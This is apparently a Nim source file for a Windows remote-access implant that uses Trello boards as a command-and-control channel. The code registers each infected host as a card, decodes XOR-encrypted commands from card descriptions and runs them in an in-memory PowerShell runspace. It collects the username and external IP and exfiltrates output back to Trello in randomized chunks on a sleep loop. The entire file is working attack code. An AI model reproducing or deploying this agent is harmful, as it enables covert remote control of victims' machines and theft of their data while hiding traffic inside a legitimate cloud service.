import httpclient, base64, json, osproc, random, os, strutils, net
import winim/clr
import sugar
import strformat
import puppy
#include ./libs_agent/sleep_ek
import std/json
include ./libs_agent/user
include ./libs_agent/cryptoutils
import std/base64


proc get_request(url: string, api_key: string, token:string, board_id:string):string =
    #client.headers = newHttpHeaders(@[("X-Auth", api_key), ("Identifier", $identifier), ("Content-Type", "application/json"),("Accept","application/json")])
    let response = get(url & "/1/boards/" & board_id & "/cards?key=" & api_key & "&token=" & token)
    return response.body

proc get_request_simple(url: string):string =
    #client.headers = newHttpHeaders(@[("X-Auth", api_key), ("Identifier", $identifier), ("Content-Type", "application/json"),("Accept","application/json")])
    let response = get(url)
    return response.body

proc put_request_headers(url: string, api_key: string, token:string, data:string):string =
    let response = put(url & "?key=" & api_key & "&token=" & token & "&desc=" & data)
    return response.body

proc post_request_headers(url: string, api_key: string, token:string, board_id:string):string =
    let response = post(url & "&key=" & api_key & "&token=" & token)
    return response.body

proc execute_command(command: string):string =
    var commandArgs : seq[string]
    commandArgs.add("-c")
    for element in command.split(" "):
        commandArgs.add(element)
    let (output,status_code) = execCmdEx(command, options={poUsePath, poStdErrToStdOut, poDaemon})
    #let encoded_command = encode($output)
    return $output

proc execute_powershell(command:string):string=
    echo "command: " & $command
    var Automation = load("System.Management.Automation")
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")

    var runspace = @RunspaceFactory.CreateRunspace()

    runspace.Open()

    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(command)
    pipeline.Commands.Add("Out-String")

    var results = pipeline.Invoke()

    var output = ""

    for i in countUp(0,results.Count()-1):
        #echo results.Item(i)
        output = output & $results.Item(i) & "\n"

    runspace.Close()

    #echo $output

    return $output


proc check_if_card_already_in(api_key:string,token:string,board_id:string,card_name:string):string=
    let response = get_request("https://api.trello.com",api_key,token,board_id)
    let content = parseJson(response)
    for card in content.items:
        if string($card["name"]).replace("\"","") == card_name:
            return string($card["shortLink"]).replace("\"","")
    return ""

proc main():float =
    #main()
    let api_key = ""
    let token = ""
    let board_id = ""
    var registered = false
    let hostname = string(getWinHostName())
    echo hostname
    let response = get_request("https://api.trello.com",api_key,token,board_id)
    let content = parseJson(response)
    var idlist=""
    var good_card = ""
    var sleep_next = 30.0
    var commandline = ""
    for card in content.items:
        #for key,value in card.pairs:
        #    echo $key & " = " & $value
        echo string($card["name"]).replace("\"","") & " = " & "tache-" & hostname
        idlist = string($card["idList"]).replace("\"","")
        if string($card["name"]).replace("\"","") == "tache-" & hostname:
            good_card = string($card["shortLink"]).replace("\"","")
            registered = true
    if not registered:
        echo "need to register"
        discard post_request_headers("https://api.trello.com/1/cards?idList=" & idlist & "&name=" & "tache-" & hostname,api_key,token,board_id)
    else:
        echo "do things"
        var decoded = ""
        for card in content.items:
            if string($card["name"]).replace("\"","") == "tache-" & hostname:
                try:
                    echo string($card["desc"]).replace("\"","")
                    decoded = decode(string($card["desc"]).replace("\"",""))
                except:
                    decoded = """{}"""
        var packed_command: JsonNode
        try:
            packed_command = parseJson(decoded)
        except:
            packed_command = parseJson("{}")
        if packed_command.kind == JObject and packed_command.len == 0:
            discard
        else:
            echo "command packer :",packed_command
            if string($packed_command["type"]).replace("\"","")=="command":
                echo "Type detected : command, resuming to execution"
                var password = "D34db33fD3f4ult"
                var payload = string($packed_command["payload"]).replace("\"","")
                var nonce = string($packed_command["nonce"]).replace("\"","")
                var xor_pass = password & nonce
                payload = decode(payload)
                var secret_payload = ""
                try:
                    secret_payload = cast[string](xor_encrypt_decrypt(cast[seq[byte]](payload),cast[seq[byte]](xor_pass)))
                    echo $secret_payload
                except:
                    secret_payload = ""
                if secret_payload != "":
                    var exec_payload = parseJson(secret_payload)
                    commandline = decode(string($exec_payload["payload"]).replace("\"",""))
                    var task_id = string($exec_payload["id"]).replace("\"","")
                    var sleep_next = exec_payload["sleep_next"].getFloat
                    echo "executing " & $commandline & " task id " & $task_id & " next sleep " & $sleep_next
                    var to_send = ""
                    if $commandline != "checkin":
                        to_send = $execute_powershell(commandline)
                    else:
                        echo "checkin"
                        var username = GetUser()
                        var ip_addr = get_request_simple("https://ifconfig.me/ip")
                        to_send = username & "," & ip_addr
                        #echo to_send
                    var secret_payload_out = $(%*{"id":task_id,"payload":encode($to_send)})
                    secret_payload_out = encode(cast[string](xor_encrypt_decrypt(cast[seq[byte]](secret_payload_out),cast[seq[byte]](xor_pass))))

                    var wrapper = encode($(%*{"stage":"implented","payload":secret_payload_out,"nonce":nonce,"type":"output"}))
                    echo wrapper
                    var chunk_size = rand(6000 .. 10000)
                    if len(wrapper)>chunk_size:
                        echo "too big to be sent, need to do multiple cards"
                        var modulo = int(len(wrapper) mod int(chunk_size))
                        var number_of_cards = int((len(wrapper)-modulo)/int(chunk_size))
                        echo "need to do " & $(number_of_cards+1) & " cards, with the last one containing " & $(modulo) & " o"
                        
                        var part = ""
                        for index in 0..<number_of_cards+1:
                            sleep((index)*1000)
                            if index==number_of_cards:
                                part = wrapper[index*chunk_size ..< min(wrapper.len, (chunk_size*index)+modulo)]
                            else:
                                part = wrapper[index*chunk_size ..< min(wrapper.len, (chunk_size*(index+1)))]
                            echo "\npart: " & part
                            if index==0:
                                echo $put_request_headers("https://api.trello.com/1/cards/" & good_card,api_key,token,part)
                                #echo "post it"
                            else:
                                var shortlink = ""
                                #api_key:string,token:string,board_id:string,card_name:string
                                var card_already_in = check_if_card_already_in(api_key, token, board_id,"tache-" & hostname & "-" & $index)
                                if card_already_in == "":
                                    var card_creation_output = post_request_headers("https://api.trello.com/1/cards?idList=" & idlist & "&name=" & "tache-" & hostname & "-" & $index,api_key,token,board_id)
                                    var output_card_json = parseJson(card_creation_output)
                                    shortlink = string($output_card_json["shortLink"]).replace("\"","")
                                else:
                                    shortlink = card_already_in
                                discard put_request_headers("https://api.trello.com/1/cards/" & shortlink,api_key,token,part)
                    else:
                        echo "Sending output"
                        discard put_request_headers("https://api.trello.com/1/cards/" & good_card,api_key,token,wrapper)
                    
                else:
                    discard

            else:
                discard
    echo sleep_next
    return sleep_next
            
    #echo response
    #echo getWinHostName()
    #echo get_request_headers("https://www.google.com","","")
    #let response = get("https://www.google.com/")
    #echo response.body

when isMainModule:
    randomize()
    while true:
        sleep(int(main()*1000))